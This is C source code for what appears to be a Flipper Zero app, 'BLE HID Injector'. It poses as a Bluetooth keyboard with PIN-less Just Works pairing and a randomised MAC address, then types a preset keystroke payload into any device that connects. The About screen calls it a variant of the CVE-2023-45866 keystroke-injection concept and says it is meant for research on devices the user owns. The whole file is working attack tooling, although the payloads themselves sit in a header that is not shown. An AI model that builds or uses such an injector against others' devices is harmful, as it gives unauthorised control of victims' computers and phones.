#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/widget.h>
#include <notification/notification_messages.h>
#include <bt/bt_service/bt.h>
#include <ble_profile/extra_profiles/hid_profile.h>
#include <gap.h>

#include "helpers/hid_payloads.h"

#define TAG "BleHidInject"

// BLE HID profile with Just Works pairing
typedef struct {
    char name[FURI_HAL_BT_ADV_NAME_LENGTH];
    uint8_t mac[GAP_MAC_ADDR_SIZE];
    bool bonding;
    GapPairing pairing;
} HidExtParams;

static FuriHalBleProfileBase* hid_ext_start(FuriHalBleProfileParams params) {
    UNUSED(params);
    return ble_profile_hid->start(NULL);
}

static void hid_ext_stop(FuriHalBleProfileBase* profile) {
    ble_profile_hid->stop(profile);
}

static void hid_ext_get_config(GapConfig* config, FuriHalBleProfileParams params) {
    furi_check(config);
    HidExtParams* p = params;
    ble_profile_hid->get_gap_config(config, NULL);
    memcpy(config->mac_address, p->mac, sizeof(config->mac_address));
    strlcpy(config->adv_name + 1, p->name, sizeof(config->adv_name) - 1);
    config->bonding_mode = p->bonding;
    config->pairing_method = p->pairing;
}

static const FuriHalBleProfileTemplate hid_inject_profile = {
    .start = hid_ext_start,
    .stop = hid_ext_stop,
    .get_gap_config = hid_ext_get_config,
};

typedef enum {
    HidViewSubmenu,
    HidViewWidget,
} HidViewId;

typedef enum {
    HidStateMenu,
    HidStateWaiting,
    HidStateInjecting,
    HidStateDone,
} HidState;

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    Widget* widget;
    NotificationApp* notifications;
    Bt* bt;
    FuriHalBleProfileBase* profile;
    FuriTimer* timer;

    uint8_t selected_payload;
    HidState hid_state;
    uint8_t inject_idx;
} HidInjectorApp;

#define CUSTOM_EVENT_TICK   100
#define CUSTOM_EVENT_ABOUT  (PAYLOAD_COUNT)

static void hid_timer_cb(void* ctx) {
    HidInjectorApp* app = ctx;
    view_dispatcher_send_custom_event(app->view_dispatcher, CUSTOM_EVENT_TICK);
}

static void hid_submenu_cb(void* ctx, uint32_t idx) {
    HidInjectorApp* app = ctx;
    view_dispatcher_send_custom_event(app->view_dispatcher, idx);
}

static void show_waiting(HidInjectorApp* app) {
    const HidPayload* pl = &hid_payloads[app->selected_payload];
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignTop, FontPrimary, "Advertising...");
    widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignTop, FontSecondary, "\"Bluetooth Keyboard\"");
    widget_add_string_element(app->widget, 64, 32, AlignCenter, AlignTop, FontSecondary, "Waiting for target");
    widget_add_string_element(app->widget, 64, 44, AlignCenter, AlignTop, FontSecondary, pl->name);
    widget_add_string_element(app->widget, 64, 58, AlignCenter, AlignTop, FontSecondary, "Back to cancel");
    view_dispatcher_switch_to_view(app->view_dispatcher, HidViewWidget);
}

static void start_hid_profile(HidInjectorApp* app) {
    HidExtParams hid_cfg = {
        .bonding = false,
        .pairing = GapPairingNone,
    };
    strlcpy(hid_cfg.name, "Bluetooth Keyboard", sizeof(hid_cfg.name));
    furi_hal_random_fill_buf(hid_cfg.mac, sizeof(hid_cfg.mac));
    hid_cfg.mac[0] |= 0xC0; // random static

    app->bt = furi_record_open(RECORD_BT);
    app->profile = bt_profile_start(app->bt, &hid_inject_profile, &hid_cfg);

    if(!app->profile) {
        FURI_LOG_E(TAG, "Failed to start HID profile");
        furi_record_close(RECORD_BT);
        app->bt = NULL;
        return;
    }

    app->hid_state = HidStateWaiting;
    app->inject_idx = 0;
    show_waiting(app);
    furi_timer_start(app->timer, 200);
}

static void stop_hid_profile(HidInjectorApp* app) {
    furi_timer_stop(app->timer);
    if(app->profile) {
        ble_profile_hid_kb_release_all(app->profile);
        bt_profile_restore_default(app->bt);
        app->profile = NULL;
    }
    if(app->bt) {
        furi_record_close(RECORD_BT);
        app->bt = NULL;
    }
    app->hid_state = HidStateMenu;
}

static bool hid_custom_event_cb(void* ctx, uint32_t event) {
    HidInjectorApp* app = ctx;

    // Menu events
    if(app->hid_state == HidStateMenu) {
        if(event < PAYLOAD_COUNT) {
            app->selected_payload = event;
            start_hid_profile(app);
            return true;
        } else if(event == CUSTOM_EVENT_ABOUT) {
            widget_reset(app->widget);
            widget_add_text_scroll_element(
                app->widget, 0, 0, 128, 64,
                "BLE HID Injector v0.1\n\n"
                "Advertises as a BLE\n"
                "keyboard with Just Works\n"
                "pairing (no PIN).\n\n"
                "When a device connects,\n"
                "the selected keystroke\n"
                "payload is injected.\n\n"
                "BLE variant of\n"
                "CVE-2023-45866 concept.\n\n"
                "For security research\n"
                "on devices you own.\n\n"
                "@KaraZajac");
            view_dispatcher_switch_to_view(app->view_dispatcher, HidViewWidget);
            return true;
        }
    }

    // Tick events for waiting/injecting states
    if(event == CUSTOM_EVENT_TICK) {
        if(app->hid_state == HidStateWaiting) {
            // Check if target connected by trying gap_get_state
            if(gap_get_state() == GapStateConnected) {
                app->hid_state = HidStateInjecting;
                app->inject_idx = 0;

                widget_reset(app->widget);
                widget_add_string_element(app->widget, 64, 15, AlignCenter, AlignTop, FontPrimary, "CONNECTED!");
                widget_add_string_element(app->widget, 64, 35, AlignCenter, AlignTop, FontSecondary, "Injecting keystrokes...");
                view_dispatcher_switch_to_view(app->view_dispatcher, HidViewWidget);

                FURI_LOG_I(TAG, "Target connected, starting injection");
                furi_timer_start(app->timer, 500); // delay before first key
            }
            return true;
        }

        if(app->hid_state == HidStateInjecting && app->profile) {
            const HidPayload* pl = &hid_payloads[app->selected_payload];

            if(app->inject_idx < pl->key_count) {
                const HidKeystroke* ks = &pl->keys[app->inject_idx];

                // Build key code: modifier in high byte, key in low byte
                uint16_t keycode = ks->key;
                if(ks->mod) keycode |= (uint16_t)(ks->mod) << 8;

                ble_profile_hid_kb_press(app->profile, keycode);
                furi_delay_ms(30);
                ble_profile_hid_kb_release_all(app->profile);

                app->inject_idx++;

                uint16_t delay = ks->delay_ms ? ks->delay_ms : 50;
                furi_timer_start(app->timer, delay);
            } else {
                // Done
                app->hid_state = HidStateDone;
                furi_timer_stop(app->timer);

                widget_reset(app->widget);
                widget_add_string_element(app->widget, 64, 15, AlignCenter, AlignTop, FontPrimary, "Injection Complete");

                char status[48];
                snprintf(status, sizeof(status), "%d keystrokes sent", pl->key_count);
                widget_add_string_element(app->widget, 64, 35, AlignCenter, AlignTop, FontSecondary, status);
                widget_add_string_element(app->widget, 64, 52, AlignCenter, AlignTop, FontSecondary, "Back to exit");
                view_dispatcher_switch_to_view(app->view_dispatcher, HidViewWidget);

                notification_message(app->notifications, &sequence_success);
            }
            return true;
        }
    }

    return false;
}

static bool hid_back_event_cb(void* ctx) {
    HidInjectorApp* app = ctx;

    if(app->hid_state != HidStateMenu) {
        stop_hid_profile(app);
        // Return to menu
        view_dispatcher_switch_to_view(app->view_dispatcher, HidViewSubmenu);
        return true;
    }
    return false; // exit app
}

int32_t ble_hid_injector_app(void* p) {
    UNUSED(p);

    HidInjectorApp* app = malloc(sizeof(HidInjectorApp));
    memset(app, 0, sizeof(HidInjectorApp));

    app->gui = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);

    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, hid_custom_event_cb);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, hid_back_event_cb);

    app->submenu = submenu_alloc();
    view_dispatcher_add_view(app->view_dispatcher, HidViewSubmenu, submenu_get_view(app->submenu));
    app->widget = widget_alloc();
    view_dispatcher_add_view(app->view_dispatcher, HidViewWidget, widget_get_view(app->widget));

    app->timer = furi_timer_alloc(hid_timer_cb, FuriTimerTypePeriodic, app);
    app->hid_state = HidStateMenu;

    // Build menu
    submenu_set_header(app->submenu, "BLE HID Inject");
    for(uint8_t i = 0; i < PAYLOAD_COUNT; i++) {
        submenu_add_item(app->submenu, hid_payloads[i].name, i, hid_submenu_cb, app);
    }
    submenu_add_item(app->submenu, "About", CUSTOM_EVENT_ABOUT, hid_submenu_cb, app);

    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_switch_to_view(app->view_dispatcher, HidViewSubmenu);
    view_dispatcher_run(app->view_dispatcher);

    // Cleanup
    stop_hid_profile(app);

    furi_timer_free(app->timer);
    view_dispatcher_remove_view(app->view_dispatcher, HidViewSubmenu);
    submenu_free(app->submenu);
    view_dispatcher_remove_view(app->view_dispatcher, HidViewWidget);
    widget_free(app->widget);
    view_dispatcher_free(app->view_dispatcher);

    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    free(app);
    return 0;
}
